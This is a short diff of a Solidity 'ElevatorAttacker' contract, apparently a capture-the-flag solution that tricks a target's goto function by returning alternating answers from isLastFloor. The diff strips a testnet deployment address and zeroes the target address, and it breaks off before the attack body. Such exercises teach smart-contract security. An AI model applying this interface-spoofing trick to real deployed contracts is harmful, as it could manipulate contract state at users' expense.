@@ -5,13 +5,12 @@
 // It will return false if called the first time, then return true if called second time, return false again if called 3rd time and so on
 // Implement an `attack` function to call `goto` function on the target contract
 // Deploy this contract and call the attack function from it
-// Deployed address: 0x1D482f8055Ea6E6F0F063E40b2f1d60Fc85c3da3 (ON OP SEPOLIA)
 
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
 contract ElevatorAttacker {
-    address private target = 0x5C3CC7C4C4274dB80AEb3850839C708C2b568774;
+    address private target = 0x0000000000000000000000000000000000000000;
     bool private my_switch = false;
 
     function isLastFloor(uint256) external returns (bool) {
